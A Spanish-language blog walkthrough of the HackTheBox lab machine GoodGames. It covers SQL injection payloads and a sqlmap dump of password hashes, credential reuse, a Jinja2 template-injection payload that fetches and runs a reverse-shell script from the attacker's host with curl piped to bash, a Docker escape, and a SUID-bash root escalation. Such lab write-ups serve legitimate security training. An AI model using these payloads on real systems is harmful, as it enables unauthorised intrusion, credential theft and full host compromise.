---
layout: single
title: GoodGames HTB - WriteUp
excerpt: WriteUp de la máquina GoodGames de HTB.
date: 2024-04-23
classes: wide
header:
  teaser: /assets/images/GoodGames/GoodGames.png
  teaser_home_page: true
  icon: /assets/images/GoodGames/GoodGames.png
categories:
  - infosec
tags:
  - ctf
  - Linux
  - Writeup
  - Web-Enum
  - SQLI
  - SSTI
  - Docker
  - Privesc
---


En el día de hoy estaremos resolviendo la máquina GoodGames de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.130.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Enumeration](#web-enumeration)
3. [Exploiting SQLI](#exploiting-sqli)
	1. [Cracking Admin Password](#cracking-admin-password)
4. [Subdomain Enumeration](#subdomain-enumeration)
5. [Exploiting SSTI](#exploiting-ssti)
6. [Docker Escape](#docker-escape)
7. [Privesc To Root](#privesc-to-root)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p80 10.10.11.130
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-26 17:49 CEST
Nmap scan report for 10.10.11.130
Host is up (0.045s latency).

PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds
```

Podemos ver el puerto 80 abierto, además nmap nos indica que el servidor está montado con Werkzeug (Python).


### Web Enumeration

Si entramos a la web podemos ver un foro de juegos, tiene una funcionalidad que nos permite crearnos una cuenta e iniciar sesión con ella.

![](/assets/images/GoodGames/img1.png)

Vamos a crearnos una cuenta para ver si podemos acceder a mas funcionalidades.

![](/assets/images/GoodGames/img2.png)


Cuando nos loggeamos podemos ver la siguiente pantalla, vemos nuestro nombre de usuario reflejado, podríamos intentar hacer un SSTI,En este caso no es posible.
Vamos a capturar con Burp la requests de login.


### Exploiting SQLI

Si probamos una inyección SQL basica podemos ver como el inicio de sesión es efectuado y nos dumpea los usuarios. Vamos a extraer los datos de la BD.

![](/assets/images/GoodGames/img3.png)

```bash
❯ sqlmap -r req.txt  --level=5 --risk=3 -D main -T user --dump                                                                                                                               
        ___                                                                                                                                                                                  
       __H__                                                                                                                                                                                 
 ___ ___[)]_____ ___ ___  {1.5.3#stable}                                                                                                                                                     
|_ -| . [,]     | .'| . |                                                                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                    
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                  
                                                                                                                                                                                             
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws
. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                                     
                                                                                                                                                                                             
[*] starting @ 18:07:44 /2023-03-26/                                                                                                                                                         
                                                                                                                                                                                             
[18:07:44] [INFO] parsing HTTP request from 'req.txt'                                                                                                                                        
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]                                                                                                         
[18:07:45] [INFO] resuming back-end DBMS 'mysql'                                                                                                                                             
[18:07:45] [INFO] testing connection to the target URL                                                                                                                                       
sqlmap resumed the following injection point(s) from stored session:                                                                                                                         
---                                                                                                                                                                                          
Parameter: #1* ((custom) POST)                                                                                                                                                               
    Type: boolean-based blind                                                                                                                                                                
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)                                                                                                             
    Payload: email=' AND 2736=(SELECT (CASE WHEN (2736=2736) THEN 2736 ELSE (SELECT 5938 UNION SELECT 5385) END))-- -&password=test1                                                         

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 5441 FROM (SELECT(SLEEP(5)))wPou)-- pKdl&password=test1
Table: user
[3 entries]
+----+---------+---------------------+----------------------------------+
| id | name    | email               | password                         |
+----+---------+---------------------+----------------------------------+
| 1  | admin   | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test123 | test@example.com    | 912b7bc95fb9e6885a4685746433f39a |
| 3  | test    | test@goodgames.htb  | 0                                |
+----+---------+---------------------+----------------------------------+
```

### Cracking admin password

Si intentamos romper el hash del administrador, podemos conseguir la contraseña en claro.

![](/assets/images/GoodGames/img4.png)

Si quisieramos extraer los datos de forma manual, podríamos usar la siguiente query.

```SQL
'union+select+1,2,3,group_concat(name,':',password)+from+user--+-
```

![](/assets/images/GoodGames/img5.png)


### Subdomain Enumeration

Si iniciamos sesión como adminsitradores podemos ver que tenemos acceso a un panel. En la siguiente url http://internal-administration.goodgames.htb/

Vamos a añadir goodgames.htb y el subdominio al /etc/hosts. Si intentamos acceder podemos ver lo siguiente:

![](/assets/images/GoodGames/img6.png)


Vamos a intentar reutilizar la contraseña que tenemos para el usuario admin. Podemos observar que las credenciales son válidas. Podemos ver que hay una parte que nos permite cambiar datos nuestros.


![](/assets/images/GoodGames/img7.png)

Esta parte de la aplicación también está hecha en python. Podemos usar la herramienta whatweb para comprobarlo.

```bash
❯ whatweb http://internal-administration.goodgames.htb/settings
http://internal-administration.goodgames.htb/settings [403 Forbidden] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.6.7], IP[10.10.11.130], Meta-Author[Themesberg], Open-Graph-Protocol[website], Python[3.6.7], Script, Title[Flask Volt Dashboard -  Error 403  | AppSeed][Title element contains newline(s)!], Werkzeug[2.0.2]
```


### Exploiting SSTI

Vamos a intentar explotar un SSTI en ese punto.

![](/assets/images/GoodGames/img8.png)

Se esta ejecutando el payload correctamente, vamos a intentar establecernos una revshell. Si usamos el siguiente payload podemos explotarlo.

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.16.6/shell.sh|bash').read() }}
```

Si miramos nuestro listener podemos ver una shell, le haremos el tratamiento de la TTY y empezaremos a enumerar para la escalada de privilegios.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
B2connect to [10.10.16.6] from goodgames.htb [10.10.11.130] 47556
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# id
B2id
bash: B2id: command not found
root@3a453ab39d3d:/backend# id     
id
uid=0(root) gid=0(root) groups=0(root)
```

### Docker Escape

Estamos dentro de un contenedor de Docker, vamos a intentar escapar de este contexto.

```bash
root@3a453ab39d3d:/# ls -la
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 .
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Mar 26 14:41 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 12  2018 media
drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
dr-xr-xr-x 176 root root    0 Mar 26 14:41 proc
drwx------   1 root root 4096 Nov  5  2021 root
drwxr-xr-x   3 root root 4096 Nov 12  2018 run
drwxr-xr-x   1 root root 4096 Nov  5  2021 sbin
drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
dr-xr-xr-x  13 root root    0 Mar 26 14:41 sys
drwxrwxrwt   1 root root 4096 Nov  5  2021 tmp
drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
drwxr-xr-x   1 root root 4096 Nov 12  2018 var
root@3a453ab39d3d:/# cat .dockerenv
```

En este caso es fácil escapar, tendremos que conectarnos por ssh a la máquina principal (dado que tenemos conexión con esta) reutilizando la password utilizada anteriormente, tendremos que usar el usuario augustus que podemos ver en el directorio /home

```bash
root@3a453ab39d3d:/home# ls -la
total 12
drwxr-xr-x 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 augustus
root@3a453ab39d3d:/home# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 17:34:36 2023 from 172.19.0.2
augustus@GoodGames:~$ id
uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
augustus@GoodGames:~$ 
```


### Privesc To Root

Para escalar privilegios al usuario root podemos hacerlo usando el contenedor, tendremos que hacer lo siguiente:

1. Copiar el binario bash al directorio de augustus (desde la máquina principal)

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Mar 26 17:42 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwxr-xr-x 1 augustus augustus 1234376 Mar 26 17:42 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Mar 26 15:42 user.txt

```

2. Asignarle permisos SUID (desde el contenedor) y cambiar el propietario a root.

```bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1232
drwxr-xr-x 2 1000 1000    4096 Mar 26 16:42 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwxr-xr-x 1 1000 1000 1234376 Mar 26 16:42 bash
-rw-r----- 1 root 1000      33 Mar 26 14:42 user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod +s bash
root@3a453ab39d3d:/home/augustus# 
```

3. Volver al usuario augustus y ejecutar la bash de forma privilegiada.

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 17:41:39 2023 from 172.19.0.2
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Mar 26 17:42 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-sr-x 1 root     root     1234376 Mar 26 17:42 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Mar 26 15:42 user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
bash-5.1# 
```

Ya hemos pwneado la máquina, espero que te haya servido!







